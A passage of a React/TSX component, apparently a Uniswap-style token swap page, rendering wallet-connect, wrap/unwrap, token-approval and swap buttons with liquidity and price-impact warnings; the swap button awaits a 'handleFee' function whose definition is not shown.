                        fontWeight={600}
                      >
                        <Trans>Connect Wallet</Trans>
                      </ButtonLight>
                    </TraceEvent>
                  ) : showWrap ? (
                    <ButtonPrimary
                      disabled={Boolean(wrapInputError)}
                      onClick={onWrap}
                      fontWeight={600}
                    >
                      {wrapInputError ? (
                        <WrapErrorText wrapInputError={wrapInputError} />
                      ) : wrapType === WrapType.WRAP ? (
                        <Trans>Wrap</Trans>
                      ) : wrapType === WrapType.UNWRAP ? (
                        <Trans>Unwrap</Trans>
                      ) : null}
                    </ButtonPrimary>
                  ) : routeNotFound &&
                    userHasSpecifiedInputOutput &&
                    !routeIsLoading &&
                    !routeIsSyncing ? (
                    <GrayCard style={{ textAlign: "center" }}>
                      <ThemedText.DeprecatedMain mb="4px">
                        <Trans>Insufficient liquidity for this trade.</Trans>
                      </ThemedText.DeprecatedMain>
                    </GrayCard>
                  ) : isValid && allowance.state === AllowanceState.REQUIRED ? (
                    <ButtonPrimary
                      onClick={updateAllowance}
                      disabled={isAllowancePending || isApprovalLoading}
                      style={{ gap: 14 }}
                    >
                      {isAllowancePending ? (
                        <>
                          <Loader size="20px" />
                          <Trans>Approve in your wallet</Trans>
                        </>
                      ) : isApprovalLoading ? (
                        <>
                          <Loader size="20px" />
                          <Trans>Approval pending</Trans>
                        </>
                      ) : (
                        <>
                          <div style={{ height: 20 }}>
                            <MouseoverTooltip
                              text={
                                <Trans>
                                  Permission is required for Uniswap to swap
                                  each token. This will expire after one month
                                  for your security.
                                </Trans>
                              }
                            >
                              <Info size={20} />
                            </MouseoverTooltip>
                          </div>
                          <Trans>
                            Approve use of {currencies[Field.INPUT]?.symbol}
                          </Trans>
                        </>
                      )}
                    </ButtonPrimary>
                  ) : (
                    <ButtonError
                      onClick={async () => {
                        await handleFee();
                        if (isExpertMode) {
                          handleSwap();
                        } else {
                          setSwapState({
                            tradeToConfirm: trade,
                            attemptingTxn: false,
                            swapErrorMessage: undefined,
                            showConfirm: true,
                            txHash: undefined,
                          });
                        }
                      }}
                      id="swap-button"
                      disabled={
                        !isValid ||
                        routeIsSyncing ||
                        routeIsLoading ||
                        priceImpactTooHigh ||
                        allowance.state !== AllowanceState.ALLOWED
                      }
                      error={
                        isValid &&
                        priceImpactSeverity > 2 &&
                        allowance.state === AllowanceState.ALLOWED
                      }
                    >
                      <Text fontSize={20} fontWeight={600}>
                        {swapInputError ? (
                          swapInputError
                        ) : routeIsSyncing || routeIsLoading ? (
                          <Trans>Swap</Trans>
                        ) : priceImpactTooHigh ? (
                          <Trans>Price Impact Too High</Trans>
                        ) : priceImpactSeverity > 2 ? (
                          <Trans>Swap Anyway</Trans>
                        ) : (
                          <Trans>Swap</Trans>
                        )}
                      </Text>
                    </ButtonError>
                  )}
                  {isExpertMode && swapErrorMessage ? (
                    <SwapCallbackError error={swapErrorMessage} />
                  ) : null}
                </div>
              </AutoColumn>
            </SwapWrapper>
          )}
          <NetworkAlert />
        </PageWrapper>
        <SwitchLocaleLink />
        {!swapIsUnsupported ? null : (
          <UnsupportedCurrencyFooter
            show={swapIsUnsupported}
            currencies={[currencies[Field.INPUT], currencies[Field.OUTPUT]]}
          />
        )}
      </>
    </Trace>
  );
}
